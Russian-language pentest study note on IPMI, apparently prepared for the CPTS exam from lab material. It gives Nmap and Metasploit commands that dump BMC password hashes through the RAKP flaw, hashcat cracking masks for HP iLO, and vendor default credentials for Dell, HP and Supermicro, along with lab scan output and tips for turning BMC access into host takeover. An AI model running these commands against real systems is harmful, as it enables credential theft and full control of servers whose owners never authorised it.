[Интерфейс управления интеллектуальной платформой](https://www.thomas-krenn.com/en/wiki/IPMI_Basics) ( `IPMI`IPMI) — это набор стандартизированных спецификаций для аппаратных систем управления хостом, используемых для управления и мониторинга системы. Он действует как автономная подсистема и работает независимо от BIOS, ЦП, микропрограммного обеспечения и базовой операционной системы хоста. IPMI предоставляет системным администраторам возможность управлять и контролировать системы, даже если они выключены или находятся в неактивном состоянии. Он работает с использованием прямого сетевого соединения с оборудованием системы и не требует доступа к операционной системе через командную оболочку. IPMI также может использоваться для удаленного обновления систем без необходимости физического доступа к целевому хосту. IPMI обычно используется тремя способами:

### 1. 🚀 Quick Commands

**OS Terminal**
```bash
# Сканирование порта IPMI (623/UDP) и определение версии через Nmap
sudo nmap -sU --script ipmi-version -p 623 <TARGET_IP>

# Использование модуля Metasploit для идентификации версии IPMI
msfconsole -q -x "use auxiliary/scanner/ipmi/ipmi_version; set RHOSTS <TARGET_IP>; run; exit"

# Дамп хешей паролей пользователей через уязвимость протокола RAKP
msfconsole -q -x "use auxiliary/scanner/ipmi/ipmi_dumphashes; set RHOSTS <TARGET_IP>; run; exit"

# Взлом полученного хеша IPMI 2.0 с помощью Hashcat (режим 7300) по словарю
hashcat -m 7300 <HASH_FILE> <WORDLIST>

# Атака по маске для заводских паролей HP iLO (8 символов: заглавные буквы и цифры)
hashcat -m 7300 <HASH_FILE> -a 3 ?1?1?1?1?1?1?1?1 -1 ?d?u
```

---

### 2. 🛠 Tools & Utilities

* `[[Nmap]]` — используется для обнаружения открытых UDP-портов и запуска NSE-скрипта `ipmi-version`.
* `[[Metasploit Framework]]` — содержит модули для сканирования версий (`ipmi_version`) и дистанционного извлечения хешей паролей (`ipmi_dumphashes`).
* `[[Hashcat]]` — мощный инструмент для офлайн-взлома хешей, поддерживающий специфический режим `7300` для IPMI 2.0 RAKP.

---

### 3. 📝 Technical Analysis & Media

#### Порты и Службы
| Порт | Протокол | Сервис | Описание |
| :--- | :--- | :--- | :--- |
| 623 | UDP | asf-rmcp (IPMI) | Основной порт для дистанционного управления и мониторинга оборудования (BMC). |

> [!info] Теория и Принципы IPMI
> **IPMI (Intelligent Platform Management Interface)** — это автономная подсистема, работающая независимо от BIOS, CPU и ОС хоста. Она позволяет управлять системой, даже если она выключена или ОС зависла.
> 
> **Ключевые сценарии использования:**
> - Изменение настроек BIOS до загрузки ОС.
> - Управление питанием (включение/выключение), когда хост обесточен (но подключен к сети).
> - Восстановление доступа после критического сбоя системы.
> 
> **Компоненты архитектуры:**
> - **BMC (Baseboard Management Controller):** Микроконтроллер (обычно ARM на Linux), «сердце» IPMI.
> - **ICMB (Intelligent Chassis Management Bus):** Интерфейс связи между шасси.
> - **IPMB (Intelligent Platform Management Bus):** Шина расширения возможностей BMC.
> - **Память IPMI:** Хранилище логов (SEL), инвентаризации и репозитория.
> - **Коммуникационные интерфейсы:** LAN, последовательные порты, шина PCI.

#### Перечисление (Enumeration)

> [!example] Вывод Nmap (ipmi-version)
> ```shellsession
> MuraMitchi@htb[/htb]$ sudo nmap -sU --script ipmi-version -p 623 ilo.inlanfreight.local
> Starting Nmap 7.92 ( https://nmap.org ) at 2021-11-04 21:48 GMT
> Nmap scan report for ilo.inlanfreight.local (172.16.2.2)
> Host is up (0.00064s latency).
> 
> PORT    STATE SERVICE
> 623/udp open  asf-rmcp
> | ipmi-version: 
> |   Version: 
> |     IPMI-2.0
> |   UserAuth: 
> |   PassAuth: auth_user, non_null_user
> |_  Level: 2.0
> MAC Address: 14:03:DC:67:18:6A (Hewlett Packard Enterprise)
> 
> Nmap done: 1 IP address (1 host up) scanned in 0.46 seconds
> ```

> [!example] Сканирование через Metasploit
> ```shellsession
> msf6 > use auxiliary/scanner/ipmi/ipmi_version 
> msf6 auxiliary(scanner/ipmi/ipmi_version) > set rhosts 10.129.42.195
> msf6 auxiliary(scanner/ipmi/ipmi_version) > run
> 
> [*] Sending IPMI requests to 10.129.42.195->10.129.42.195 (1 hosts)
> [+] 10.129.42.195:623 - IPMI - IPMI-2.0 UserAuth(auth_msg, auth_user, non_null_user) PassAuth(password, md5, md2, null) Level(1.5, 2.0) 
> [*] Scanned 1 of 1 hosts (100% complete)
> [*] Auxiliary module execution completed
> ```

---

### 4. 🔍 Command Breakdown (Deep Dive)

| Команда/Флаг | Описание | Зачем это для CPTS |
| :--- | :--- | :--- |
| `nmap -sU` | UDP сканирование. | IPMI работает исключительно по протоколу UDP. |
| `--script ipmi-version` | NSE-скрипт для извлечения версии IPMI. | Подтверждает наличие IPMI 2.0, который уязвим к RAKP. |
| `auxiliary/scanner/ipmi/ipmi_dumphashes` | Модуль MSF для запроса хешей. | Позволяет получить хеш любого пользователя без знания пароля. |
| `hashcat -m 7300` | Режим взлома "IPMI2 RAKP HMAC-SHA1". | Критически важен для преобразования перехваченного хеша в открытый пароль. |
| `-a 3 ?1... -1 ?d?u` | Маска: цифры (?d) и заглавные буквы (?u). | Эффективна против дефолтных паролей HP iLO. |

---

### 5. ⚠️ Vulnerable Configurations & Flaws (Critical)

> [!warning] Критические недостатки IPMI 2.0
> 1. **Уязвимость протокола RAKP:** Спецификация IPMI 2.0 требует, чтобы сервер отправлял клиенту соленый хеш пароля (SHA1 или MD5) **ДО** завершения аутентификации. Это фундаментальный недостаток дизайна.
>    - **Вектор:** Атакующий может запросить хеш для любого существующего пользователя (например, `ADMIN`, `root`) и взломать его офлайн.
> 2. **Учетные данные по умолчанию:** Администраторы часто забывают сменить пароли на BMC.
> 
> **Стандартные пароли:**
> | Продукт | Пользователь | Пароль |
> | :--- | :--- | :--- |
> | **Dell iDRAC** | `root` | `calvin` |
> | **HP iLO** | `Administrator` | Случайная строка (8 симв., цифры + ВЕРХНИЙ РЕГИСТР) |
> | **Supermicro** | `ADMIN` | `ADMIN` |

---

### 6. 💡 Pentest Insights

> [!tip] Хакерские хитрости
> - **Полный контроль:** Доступ к IPMI эквивалентен физическому доступу. Вы можете смонтировать виртуальный ISO-образ и переустановить ОС или загрузиться в Live-режим для сброса пароля root.
> - **Повторное использование паролей:** Хеши IPMI часто взламываются легче, чем доменные. Пароль от BMC часто совпадает с паролем администратора в других системах.
> - **Скрытые интерфейсы:** Если порт 623 закрыт, проверьте наличие веб-интерфейса (HTTP/HTTPS) или SSH — BMC часто предоставляют альтернативные пути управления.

---

### 7. 🔗 Connections (Dynamic Wiki-Links)

* [[Footprinting]]
* [[Network Protocols]]
* [[Information Disclosure]]
* [[Clear-Text Protocols]]
* [[Post-Exploitation]]
* [[Hardware Security]]
* [[Metasploit Framework]]
* [[Hashcat]]